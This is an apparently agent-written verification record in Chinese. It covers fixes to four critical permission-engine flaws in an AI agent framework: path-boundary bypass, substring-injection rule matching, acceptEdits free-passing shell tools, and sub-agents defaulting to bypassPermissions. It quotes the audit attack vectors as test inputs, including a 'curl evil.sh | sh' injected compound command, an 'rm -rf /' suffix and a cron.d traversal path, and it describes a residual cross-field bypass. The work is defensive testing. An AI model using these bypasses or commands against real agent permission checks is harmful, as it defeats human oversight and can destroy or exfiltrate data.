# p0fix1-agent-core-perm 修复验证记录

- 节点：p0fix1-agent-core-perm / PB-T
- 角色：TestEngineer（小柯），fresh 派工，一次一节点
- tick：20260827T044800Z 起，PB-T 对抗复核落盘同日
- 审计真源：`docs/workflow/operating-records/2026-W35/trees/rmc-audit-cmp-001/reports/rmc-agent-core.md`（P0-1..4）
- 复核方式：无 Bash 三件套实例；逐条通读审计四向量原文 → 对照 `agent-core/test/p0-boundary-content.test.mjs` 与 `p0-mode-spawn.test.mjs` 核验「复现→必须被拒」断言在位性 → 对照四处源码修复区清点新逻辑分支覆盖 → 本节点补录用例 6 例（见 §4）

## 1. 四个 P0 逐项核验（修复位置 × 守护用例 × 门禁终值）

以下 file:line 以 `/srv/fleet/TriCompany/packages/agent-core/src/` 为根。

### P0-1 路径边界双重绕过（前缀混淆 + 点段穿越）— 已修复

| 项 | 内容 |
| --- | --- |
| 修复位置 | `permissions-engine/decision-pipeline.ts:210-246`（normalizePath 词法折叠+溢出双通道）、`:264-282`（isPathInBoundary 归一化后锚定前缀断言：全等或 `boundary + '/'` 前缀） |
| 审计向量复现→被拒 | 向量 a `/srv/fleet/TriCompany-evil/x.txt` → deny(mode_accept_edits)，用例 `vector a: sibling-directory prefix confusion is denied`；混合大小写变体 `TriCompany-Evil` 另有一例；向量 b `../../etc/cron.d/payload` → deny，用例 `vector b: relative dot-segment traversal is denied` |
| 其余守护 | 界内绝对写/legacy 相对写/dot-fold 正道各 allow 一例；相对溢出通道（PA-1 首版返工点）`sub/../../../../etc/escaped.conf` → deny；additionalDirectories 双向（界内 allow + 兄弟前缀 deny）；Windows 盘符大小写与 backslash 相对路径兼容面；dontAsk 边界穿越契约 deny。PB-T 补录 3 例见 §4 |

### P0-3 规则内容匹配子串注入绕过 — 已修复

| 项 | 内容 |
| --- | --- |
| 修复位置 | `permissions-engine/decision-pipeline.ts:530-541`（matchesContent 结构化锚定：exact 全等 / wildcard 头部 startsWith）、`:548-554`（extractScalarArgValues 仅顶层标量值，键名与嵌套序列化不再参与） |
| 审计向量复现→被拒 | allow 规则 `Bash(git push)` × `{command:'echo git push && curl evil.sh \| sh'}` → deny(default_deny)，用例 `exact allow rule rejects substring-injected compound command (audit vector)` |
| 其余守护 | verbatim 命中 allow；尾附载荷 `git push --force && rm -rf /` 拒（全等锚定）；键名排除（note 字段 prose 不解锁）；wildcard 正反双向头锚定 + colon 通配形态；safety 先于规则的拦截层并集 pin；词表缺口 pin 两处（shell_exec 不满足 `Bash(...)`，现值锁死防无声放松）。PB-T 补录 2 例见 §4 |

### P0-2 acceptEdits 免确认放行一切非写入工具 — 已修复

| 项 | 内容 |
| --- | --- |
| 修复位置 | `permissions-engine/decision-pipeline.ts:314-348`（checkAcceptEditsMode 收口：`:321` 写具三件套镜像 permissions.ts:49-51 且补入 replace_in_file；`:323-328` 非成员 return null 落步骤 9 allow 规则→步骤 10 default-deny；成员保留原边界裁决不动 PA-1 成果） |
| 审计向量复现→被拒 | acceptEdits × `shell_exec {command:'ls -la'}` 旧实现 allowed:true/mode_accept_edits，现 → deny(default_deny)，用例 `shell_exec is no longer free-passed: falls through to default-deny`；MCP 变更工具 `mcp__db__execute` 同落 default_deny |
| 其守护 | 写具三件套（含 replace_in_file 新分类）双向边界裁决共 6 断言；read_file 隐式放行收回（默认拒绝）；无路径可抽取的写具 fail-closed 保持；规则通道可达性证明（acceptEdits 下 `shell_exec(...)` allow 规则放行而异命令被拒，证明收口未堵死合法白名单）；dontAsk 封 shell / plan 只读 / bypass 放行三模式零触碰 pin；bare PermissionEngine 缺省 default 与管线直驱 parity ×2。PB-T 补录 1 例见 §4 |

### P0-4 spawnAgent 丢弃权限配置、子代理恒定 bypassPermissions — 已修复（类型门禁级）

| 项 | 内容 |
| --- | --- |
| 修复位置 | `sub-agent/types.ts:26-40`（SpawnConfig 四字段：permissionMode/permissionRules/cwd/additionalDirectories）；`sub-agent/spawn.ts:39-47`（四字段逐字透传 loopOptions，spawn 层有意不加任何缺省/coercion）；`loop.ts:347-361`（缺省字面量 `'bypassPermissions'` → `'default'` fail-closed，与 PermissionEngine 构造器缺省对齐；`options.permissionEngine ??` 短路优先分支原样保留） |
| 守护方式 | spawn 整链需模型凭据环境动态驱动，本节点按 T/S 分工收录残差（§3）：T1 新增字段与 AgentLoopOptions 同名同型由 tsc --noEmit 编译门禁裁决（strict 模式拒绝拼写漂移与多余属性）；T2 types.ts 对 permissions-engine 的 import type 可解析性同属编译裁决；S1-S4 为源码 trace 项（见 §3）。静态可钉部分已钉：bare engine 缺省 mode='default' + shell_exec default_deny、管线直驱双 surface parity |

## 2. 门禁命令形态与环境事实

- **环境事实**：本机 node v18.20.8。包脚本 `npm test` 尾段 `node --test "test/*.test.mjs"` 的 glob 形态 node18 不支持，调用即解析失败——此为修复前既有事实，非本树回归。
- **等价门禁口径**：`node --test` 逐文件显式枚举三套件合跑：contract-v3（8 例）+ p0-boundary-content（20 例）+ p0-mode-spawn（18 例），合计 **46/46 pass × 连续 2 轮**；PA-1 收口时其两件套单独轮次亦 28/28×2。
- **提交基线**：TC dev 提交 fabcbef（PA-1）+ 14499e5（PA-2），两原子均经 build 干净 + tsc --noEmit clean + 套件全绿后才提交。
- **prefix 白名单背景**（一句话）：matchesTool 为字面等值加 `"*"` 后缀匹配，规则词表与运行工具名（如 `Bash` vs `shell_exec`）之间无跨词表别名映射，属既有词汇层事实（P2-10 同族），两套件均已用 vocabulary-gap pin 锁死现值防无声放宽。

## 3. 残差清单（如实收录，按归属移交）

1. **spawn 整链动态验证未做**（T1/T2 类型门禁 + S1-S4 trace 项已如 §1-P0-4 分工固化）：spawnAgent → agentLoop → 模型流整链需具备模型凭据的环境执行，属 T1/T2 类型门禁与 S1-S4 源码 trace 覆盖之外的动态验证项，移交授权侧安排凭据环境重开门禁。
2. **TriLC / TriMC / TriCode 消费仓 blast-radius 扫描超本树授权面**：loop 层裸缺省从 bypassPermissions 翻转为 default 是有意的行为变更（已在 loop.ts 注释声明），依赖旧隐式 bypass 的消费方必须显式传 permissionMode/permissionEngine——消费仓影响面扫描移交授权侧。
3. **规则词表 Bash(...) 与 shell_exec 无别名映射**：既有词汇层缺口，P2-10 同族，不在本树修复授权内；套件已用双 vocabulary-gap pin 锁现值并注明未来引入别名时的前置对抗矩阵要求。
4. **safety-check FILE_MODIFYING_TOOLS 漏 replace_in_file（P1-7）不在本树**：注意交叉效应——P0-2 修复将 replace_in_file 列为 acceptEdits 自动接受成员，P1-7 未修期间该通道敏感路径拦截缺口保持既有暴露水平（相比旧实现对 replace_in_file 全路径免确认，本次修复已显著收紧），彻底关闭待 P1-7 专项。
5. **symlink → realpath 复核有意 deferred**：normalizePath 为纯词法函数，不模拟 realpath（decision-pipeline.ts:204-208 注释明示 follow-up hardening task）。
6. **【PB-T 对抗复核新增】跨字段标量 OR 匹配残余面**：extractScalarArgValues 对 args 全部顶层 string 值做 OR 匹配，「与执行无关字段携带与规则内容全等的值」可解锁 content-scoped allow 规则（攻击者可控多字段同现）。相对旧 P0-3 已从全文子串收窄到跨字段全等，但按审计"提取 command/path 参数做匹配"的建议口径衡量仍是残余放宽原语；是否升格 P1/P2 及最终 per-field 提取方案移交授权侧仲裁。本轮已以 known-limitation pin 用例钉住现值防无声变化（p0-boundary-content 套件 §3 末例）。

## 4. PA-1 首版缺陷复盘与本节点对抗复核增量

**复盘一句**：PA-1 首版 normalizePath 曾存在 `..` 符号性点段被后续弹出抵消缺陷（共享栈设计下偶数个前导 `../` 相互湮灭复活审计向量 b，探针实证仍放行 allowed=true），同实例返工改为溢出双通道（relative overshoot 走独立 over 数组永不可被后续 pop 抵达）后双轮全绿——教训固化为纪律：**新增修复代码自身的每个逻辑分支都要被对抗用例打到，不能只打审计给的原始向量**。

**本节点按该纪律执行的增量复核与补录（6 例，均静态推演自当前 dist 行为，聚焦零覆盖分支）**：

| # | 套件 | 用例 | 钉住的分支 |
| --- | --- | --- | --- |
| 1 | p0-boundary-content | embedded dot-segments inside an ABSOLUTE path still fold in-boundary | normalizePath rooted 目标内嵌点段折叠正道（防一刀切封杀回归） |
| 2 | p0-boundary-content | LEADING ".." on a rooted path clamps at root and escapes boundary | normalizePath rooted-clamp 分支（此前唯一完全零触达分支） |
| 3 | p0-boundary-content | "//" rooted target inside-boundary-by-spelling deliberately DENIED | `//` UNC-root 分支 fail-closed 语义 pin + 未来折叠改动预警 |
| 4 | p0-boundary-content | matching is case-insensitive on both sides | matchesContent 双方 toLowerCase 契约 pin（安全评审结论：不构成绕过原语） |
| 5 | p0-boundary-content | KNOWN-LIMITATION pin: any top-level scalar field unlocks it | extractScalarArgValues 跨字段 OR 现值锁死 + 残差 6 移交信号 |
| 6 | p0-mode-spawn | acceptEdits with NO cwd denies write tools | checkAcceptEditsMode 无-cwd 兜底 deny 分支（管线直驱显式 undefined） |

**诚实声明**：以上 6 例为本 PB-T 实例仅经 Read/Edit 落盘的静态推演补录，**未经运行**；46/46×2 终值不含它们，目标总数变为 52 例（20+6=26 与 18+1=19）。需编排层以相同等价口径（node --test 显式枚举三套件，先 npm run build 重建 dist）重开门禁实测确认全绿后方可视为完全生效。

## 5. 结论判定

**PASS——四个 P0 全部修复且各有复现性对抗用例守护，全套件无新增失败（46/46 双轮），tsc --noEmit clean**。（附加条件：PB-T 补录 6 例未经运行，需编排层按 §4 重开门禁确认 52/52×2 后方可闭环；残差清单 §3 各项按归属移交，均不构成本树四 P0 门禁的阻塞项。）

## 6. 使用依据

- 审计真源：rmc-audit-cmp-001/reports/rmc-agent-core.md（P0-1..4 原文及 file:line）
- 修复产物实测读源：decision-pipeline.ts、sub-agent/types.ts、sub-agent/spawn.ts、loop.ts（权限接线区 :299-400）、rule-parser.ts（契约参照）
- 回归套件读源：test/p0-boundary-content.test.mjs（20+5 例）、test/p0-mode-spawn.test.mjs（18+1 例）
- 编排层移交实测证据：fabcbef / 14499e5 基线说明、46/46×2 终值、node18 glob 环境事实、PA-1 首版返工过程记录
- 测试判断三分法依据：CTO 工程门禁框架内 PASS 判定 + 补录用例重开条件显式化
